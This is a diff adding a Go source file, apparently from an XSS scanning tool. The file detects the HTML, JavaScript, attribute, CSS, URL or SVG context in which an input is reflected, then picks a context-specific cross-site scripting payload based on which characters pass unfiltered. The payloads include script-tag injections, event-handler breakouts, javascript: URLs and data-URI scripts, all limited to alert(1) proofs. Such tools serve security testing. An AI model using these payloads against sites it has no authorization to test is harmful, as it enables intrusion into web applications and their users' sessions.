@@ -1,0 +1,240 @@
+package reflection
+
+import (
+	"strings"
+
+	"github.com/lcalzada-xor/xxss/pkg/models"
+)
+
+// DetectContext analyzes the HTML around the probe to determine reflection context
+func DetectContext(body, probe string) models.ReflectionContext {
+	// Find first occurrence of probe
+	index := strings.Index(body, probe)
+	if index == -1 {
+		return models.ContextUnknown
+	}
+
+	// Get surrounding context (500 chars before and after)
+	start := max(0, index-500)
+	end := min(len(body), index+len(probe)+500)
+	context := body[start:end]
+
+	// Check contexts in order of specificity
+	if isInComment(context, probe) {
+		return models.ContextComment
+	}
+
+	if isInMetaRefresh(context, probe) {
+		return models.ContextMetaRefresh
+	}
+
+	if isInDataURI(context, probe) {
+		return models.ContextDataURI
+	}
+
+	if isInSVG(context, probe) {
+		return models.ContextSVG
+	}
+
+	if isInTemplateLiteral(context, probe) {
+		return models.ContextTemplateLiteral
+	}
+
+	if isJS, jsContext := analyzeJavaScriptContext(context, probe); isJS {
+		return jsContext
+	}
+
+	if isInCSS(context, probe) {
+		return models.ContextCSS
+	}
+
+	if isInURL(context, probe) {
+		return models.ContextURL
+	}
+
+	if isInTagName(context, probe) {
+		return models.ContextTagName
+	}
+
+	if isInRCDATA(context, probe) {
+		return models.ContextRCDATA
+	}
+
+	if isInAttribute(context, probe) {
+		return models.ContextAttribute
+	}
+
+	// Default to HTML
+	return models.ContextHTML
+}
+
+// GetSuggestedPayload returns a context-specific XSS payload
+func GetSuggestedPayload(context models.ReflectionContext, unfiltered []string) string {
+	// Check which characters are available
+	hasLt := contains(unfiltered, "<")
+	hasGt := contains(unfiltered, ">")
+	hasDquote := contains(unfiltered, "\"")
+	hasSquote := contains(unfiltered, "'")
+	hasQuote := hasDquote || hasSquote
+	hasSpace := contains(unfiltered, " ")
+	hasEquals := contains(unfiltered, "=")
+	hasSlash := contains(unfiltered, "/")
+	hasParen := contains(unfiltered, "(") && contains(unfiltered, ")")
+
+	switch context {
+	case models.ContextHTML:
+		if hasLt && hasGt {
+			if hasSpace && hasEquals {
+				// XSS without quotes
+				return "<img src=x onerror=alert(1)>"
+			}
+			if hasSlash {
+				return "<script>alert(1)</script>"
+			}
+			return "<svg onload=alert(1)>"
+		}
+
+	case models.ContextJSSingleQuote:
+		if hasSquote {
+			return "';alert(1);//"
+		}
+		// Fallback if single quote is filtered but we are in single quote context (hard to exploit)
+
+	case models.ContextJSDoubleQuote:
+		if hasDquote {
+			return "\";alert(1);//"
+		}
+
+	case models.ContextJSRaw:
+		if hasParen {
+			return ";alert(1);//"
+		}
+		return "alert(1)"
+
+	case models.ContextJavaScript: // Deprecated fallback
+		if hasSquote {
+			return "';alert(1);//"
+		}
+		if hasDquote {
+			return "\";alert(1);//"
+		}
+		if hasParen {
+			return ";alert(1);//"
+		}
+
+	case models.ContextAttribute:
+		// Priority 1: If we have < and >, break out of tag completely
+		if hasGt && hasLt {
+			if hasDquote {
+				return "\"><script>alert(1)</script>"
+			}
+			if hasSquote {
+				return "'><script>alert(1)</script>"
+			}
+			return "><script>alert(1)</script>"
+		}
+		// Priority 2: If we have quotes and space, use event handler
+		if hasQuote && hasSpace {
+			quote := "'"
+			if hasDquote {
+				quote = "\""
+			}
+			return quote + " onmouseover=" + quote + "alert(1)"
+		}
+
+	case models.ContextCSS:
+		if hasParen {
+			return "expression(alert(1))"
+		}
+		return "x:expression(alert(1))"
+
+	case models.ContextURL:
+		// Priority 1: Break out of tag (same as Attribute)
+		if hasGt && hasLt {
+			if hasDquote {
+				return "\"><script>alert(1)</script>"
+			}
+			if hasSquote {
+				return "'><script>alert(1)</script>"
+			}
+			return "><script>alert(1)</script>"
+		}
+		// Priority 2: Javascript protocol
+		return "javascript:alert(1)"
+
+	case models.ContextTemplateLiteral:
+		// Break out of template literal
+		if contains(unfiltered, "$") && contains(unfiltered, "{") && contains(unfiltered, "}") {
+			return "${alert(1)}"
+		}
+		if contains(unfiltered, "`") {
+			return "`+alert(1)+`"
+		}
+		return "';alert(1);//"
+
+	case models.ContextSVG:
+		// SVG-specific XSS
+		if hasLt && hasGt {
+			return "<set attributeName=onmouseover value=alert(1)>"
+		}
+		if hasQuote && hasSpace {
+			quote := "'"
+			if hasDquote {
+				quote = "\""
+			}
+			return quote + " onload=" + quote + "alert(1)"
+		}
+		return "<animate onbegin=alert(1)>"
+
+	case models.ContextMetaRefresh:
+		// Meta refresh URL injection
+		return "javascript:alert(1)"
+
+	case models.ContextDataURI:
+		// Data URI XSS
+		return "data:text/html,<script>alert(1)</script>"
+
+	case models.ContextComment:
+		if hasGt && hasLt {
+			return "--><script>alert(1)</script><!--"
+		}
+
+	case models.ContextTagName:
+		if hasGt && hasSpace && hasEquals {
+			return " onload=alert(1)>"
+		}
+		if hasGt && hasLt {
+			return "><script>alert(1)</script>"
+		}
+
+	case models.ContextRCDATA:
+		if hasLt && hasGt && hasSlash {
+			return "</title><script>alert(1)</script>" // Works for textarea too as generic closer
+		}
+	}
+
+	return ""
+}
+
+func contains(slice []string, item string) bool {
+	for _, s := range slice {
+		if s == item {
+			return true
+		}
+	}
+	return false
+}
+
+func max(a, b int) int {
+	if a > b {
+		return a
+	}
+	return b
+}
+
+func min(a, b int) int {
+	if a < b {
+		return a
+	}
+	return b
+}
